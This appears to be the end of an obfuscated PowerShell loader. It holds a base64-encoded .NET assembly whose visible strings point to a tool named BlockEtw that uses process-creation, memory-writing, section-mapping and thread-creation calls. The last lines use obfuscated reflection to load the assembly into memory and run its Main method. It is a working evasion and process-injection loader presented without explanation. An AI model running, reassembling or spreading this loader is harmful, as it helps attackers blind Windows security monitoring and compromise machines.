QAAAAAAgACTIFoF3gANAAAAAACAAJMgcgzpABQAAAAAAIAAkyC8A/EAFwAAAAAAgA','WJseT4AAAAAAAAAAAAAAAAAA','AAhhhgCgYAAgAAAAAAgACTIAwFwAACAAAAAACAAJ','CCgAECRgQETQJEBgPAAs','mdAWYAAAAA','ZTZWN0aW9uAE50VW','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','F0dHJpYnV0ZXMAbHBQaXBlQXR0cmlidXRlcwBscFByb2Nlc3NBdHRyaWJ','dGVuAE1haW4AVGhyZWFkSW5mb3JtYXRpb24AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAESgQAAAKbxEAAA','EAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAA','gAAAAAAAAAAAAAAAAAAAAQABAAAAOAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAArAMAA','2F0aW9uTmFtZQBPYmplY3ROYW1lAG5hbWUAbHBDb21tYW5kTGluZQBBcGNSb3V0aW5lAE5vbmUAaFJlYWRQaXBlAFBlZWtOYW1lZFBpcGUAQ3','bnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGU','GBgOBAAB','kAGxwTnVtYmVyT2ZCeXRlc1JlY','WQAYnl0ZXNSZWFkAFZpcnR1YWxNZW1vcn','BAASs','Qcm90ZWN0AGZsTmV3UHJvdGVjdABTZWN0aW9uT2Zmc2V0AG9wX0V4cGxpY2l0AFNpemVPZlN0YWNrQ29tbWl0AGxwRW52aXJvbm1lbnQAUHJldmlvdXNTdXNwZW5kQ291bnQAZHdBdHRyaWJ1dGVDb3VudABwYWdlUHJvdABEZWxl','AAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAACg','1Js29x7iXUBAAAAQzpcVXNlcnNcYWRtaW5cRG93bmxvYWRzXEJsb2NrRXR3LW1','wU2l6ZQBuQnVmZmVy','JlYXRlUGlwZQBoV3JpdGVQaXBlAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25UeXBlAFRlcm1pbmF0ZQBWaXJ0dWFsTWVtb3J5V3JpdGUAVXBkYXRlUHJvY1RocmVhZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cml','lvdXNWYWx1ZQBTaXplT2ZTd','UAAAAAAACproDMAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AGdldF9IYW5kbGUAVGhyZWFkSGFuZGxlAGhTb3VyY2VIYW5kbGUAQ2xvc2VIYW5kbGUARHVwbGljYXRlSGFuZGxlAExkck','AAAAAAAAAAAAAAAAAAAAAAAAAAAA','gD0FqgBWgPgCqgBWgH','mFzZVByaW9ya','kABQkYCBgIE','HAQAAAAAABgBtBucKBgDaBucKBgCCBagKDwAHCwAABgCqBcMJBgBBBsMJBgA','HkAcgBpAGcAaAB0ACAAqQAgAC','CNVUwAkHQAAEAAA','oKF40WAAABJRYgwwAAAJwLcgEAAHAoGAAABnI','m46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgP','dldERsbEhhbmRsZQBTZWN0aW9uSGFuZGxlAGhTb3VyY2VQcm9jZXNzSGFuZGx','AAAAAAAAAAAQAAADAAAABQyAAAAAAAAAAAAA','QDkAEUACQDoAEoACQDsAE8ACQDwAFQACQD0AFkACQD4AF4ACQD8AGMACQAAAWgACQAEAW0','wBuAAAAAAAAALAEfAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAA','D4IAAAFAGQIAAABANYLAAACAJ4EAAADABAIAAAEACsPAAAFANgEAAAGAM0NAAAHAFUEAAAIAPoJAAAJAPAJAAAKADsCAAALAJQLAAABAAYEAAACACEMAAADAF4LAAAEAJoCAAABANUJAAAC','VAABwKBcAAAYMBggHjml','iBsMJBgDBBsMJBgCNBsMJBgCmBsMJBgDBBcMJBgCWBcg','GAKBgCdAOMgAAAAAIYYYAoGAJ0AAAABAJoLAgABAPQEAgACABcFAAADADkLAAAEAFMHAAABAFINAAACAH0IAAA','ZSIvPg0KICAgICAgPC9y','WVzc2FnZQBBZ2VudC5QSW52b2tl','AAAAAAAAAAAAAAAAA','3QAbHBBdHRyaWJ1dGVMaXN0AGhTdGRJbnB1dABoU3RkT3','BgBeBsUIBgDMCMUICgCiDKg','ATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAAAAA','AFABAAvwgAAEEAAQAaAA0BEABXAQAASQABACkADQERAGsBAABJAAUAKQANAREA6QEAAEkAFwApAA0','AA','wByAGkAcAB0AGkAbwBuAA','AA','Q8ACwkQGBgYG','GEEAAACAGkEAAABANEEAAABABQEAAACAAcMAAADAEEJAAAEA','mVjdEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFByb2Nlc3NBY2Nlc3','WRkcmVzcwB','AEACYLAAAFABYLAAAGAG8LAAAHAMsNAAAIACkPAQAJAAYKAgA','AYwBrAG','AAAAAQ','cm9jZXNzQWNjZXNzAENyZWF0ZVByb2Nlc3MAVW5pcXVlUHJvY2VzcwBoUHJvY2VzcwBOdE9wZW5Qcm9jZXNzAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MAR2V0Q3V','WdlUGF0aE5hbWUARGxsTmFtZQBscEFwcGxpY','OYW1lAEltY','AAAUQQAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','QBlAAAAYgBsAG8','BEACcAQAASQAZACkADQEQAD0BAABJABwAKQANABA','NUaHJlYWQATnRBbGVydFJlc3VtZVRocmVhZABDcmVhdGVUaHJlYWQAVW5pcXVlVGhyZWFkAGhUaHJlYWQATnRRdWVyeUluZm9ybWF0aW9uVGhyZWFkAENyZWF0ZVN1c3BlbmRlZABscFJlc2VydmVkAFNlY3VyaXR5U','1dGVzAE9ia','Q29weXJpZ2h0IMKpICAyMDIwAAApAQAkZGFlZGY3YjMtODI2Mi00ODk','Bwcm9jZXNz','AAAAAAAAAAAAA','G0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZ','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','hbEFsbG9jRXgATnRDcmVhdGVUaHJlYWRFeABSdGxDcmVhdGVQcm9jZXNzUGFyYW1','AUAACQBIAUUACQBMAYEACQBQAUoACQBUAWMACQBYAWgACQBcAW0ALgALABQCLgATAB0CLgAbADwCLgAjAEU','kd1RocmVhZElkAEluaG','ZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDw','AAAACwNAAAjfgAAmA0A','AE','AAMAEgADABMAAwAA','EBgJAgkVAAoCDg4QESQQESQCCRgOEBEgEBEYAwAACAoABgIYGBgYEAkYBQACCRgJBAABAhgFAAIBGAgJAAUCGBgYCRAJCAAFGBgYCQgICgAFAhgYHQUIEBgJAAUCGBgZCRAJCQAEAhgIEkUQCAQAAQkYBQAC','HJlcXVlc3R','JB','cMAAACAO4MAAADACwKAAAEAHkHAAAFAKM','JqXFJlbGVhc2VcYmxvY2tldHcucGRiAOdBAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAA','iCuCQ4CmwDbIAAAAACGG','AAAA==','GlvbgBOdENyZWF0ZVNlY3Rpb24ATnRNYXBWaWV3T2','wAAUQBIACoABQEAAIANAABRAEsAKgADAGcMigADABIDigADAIQCjQADAFwCjQADAFACjQADAEMDkA','wB','4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAGIAbABvAGMAawBlAHQAdwAuAGUAeAB','AAA','Z1RvQW5zaVN0cmluZwBBbGxvY2','AAMgAwADIAMAAAACoAAQ','AABBcGNBcmd1bWVudDEAS2VybmVsMzIAa2VybmVsMzIAV2luMzIAY2J','QAAAAAAAAAA','AgFAAIJGBg','KBgB0BcgKBgAFBs','AACAAJMgiw','AA','W1ld29ya0F0dHJpYnV0ZQBkd0Zp','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','F0ZURlc3RpbmF0aW9uU3RyaW5n','lAAAAAAAyAAkAAQBQAHIAbwBkAHUAYw','CLgArA','U2VydmljZQBCeXRlc0xlZnRUaGlzT','gMECqgBWgEcFqgBWgLwDqg','AAQAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','gAAAAAADQEACGJsb2NrZXR3AAAFAQAA','AAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAA','ACQAIAXIACQAMAXcACQAUAXwACQAYAUAACQAcAUUACQAkAUAACQAoAUUACQAwAXwACQA0AU8ACQA4AVQACQA8AVkACQBAAV4ACQBE','DkEAAQABAAAAEAAgAH','B0AE4AYQBtAGUAAAAAAGIAbABvAGMAa','ABJbml0aWFsaXplUHJvY','dGVQcm9jVGhyZWFkQXR0cmlidXRlTGlzd','EAAADAJEIAAAEAPwMAAABABIDAAACACEMAAADAF4LAAAEAAYEAAAFABYNAAAGAEoKAAAHADMDAAAIACUNAAAJALkNAAAKAB','AAigEAAEkALgAqAA0BEABzAAAASQA0ACoABQEAAH8LA','cwAAAADwHAAANAAAA','BWgP8IqgBW','GA4KAAUJGAkQCwgQC','AAAABAAAAAAAAAAAAAAAL9BAABPAAAAAGAAAK','AAIAAAAAAAAEkIAAAA','Jlc3MAU3RhY2taZXJvQml0cwBFeGl0U3RhdHVzAFdhaXRGb3JTaW5nbGVPYmplY3QA','Pg0KPC9hc3Nlb','CwFAAAFAHYNAAABAGcMAAACAO4MAAADACwKAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9','IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MB','3RpY3MAbWls','AIAAkyCbCaoBbQAAAAAAgACTIMQHuwF3AAAAAACAAJMgzAPDAXkAAAAAAIAAkyDZB84B','zMlByb3RlY3QAbHBmbE9sZFByb3RlY','lZFByaXZp','EF0dHJpYnV0ZQBBc3NlbWJseUNvbXBh','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','JcYmxvY2tldHdcb2','ICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLj')
    ${h`2Oc} =   ( &("{1}{0}" -f'EM','iT')  ("{3}{1}{4}{2}{0}"-f'geu','IA','e:N','vaR','bl') )."vaL`Ue"::("{1}{0}"-f 'ad','Lo').Invoke(  ${21`km}::("{1}{3}{2}{0}{4}"-f '4Strin','FromB','se6','a','g').Invoke(${aR`sJul}))
     (  &("{1}{0}" -f 'lDitem','Chi')  ("{1}{2}{0}{4}{3}" -f'r','vAria','blE:','g','PB1') )."vA`luE"::("{1}{0}" -f 'n','Mai').Invoke("")
}

